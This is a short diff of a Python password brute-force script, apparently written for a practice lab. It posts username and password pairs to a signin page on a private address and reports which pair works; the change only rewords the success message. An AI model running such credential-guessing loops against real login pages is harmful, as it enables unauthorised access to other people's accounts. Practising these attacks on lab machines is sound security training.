@@ -22,7 +22,7 @@ for u in u_list:
             url = f'http://192.168.56.3/?page=signin&username={user}&password={password}&Login=Login#'
             r = requests.post(url)
             if (not re.search(r"WrongAnswer.gif", r.text)):
-                print("Username: " + user + "\tPassword: " + password)
+                print("Successfully logged in as: " + user + "\tPassword: " + password)
                 break
         except:
             pass
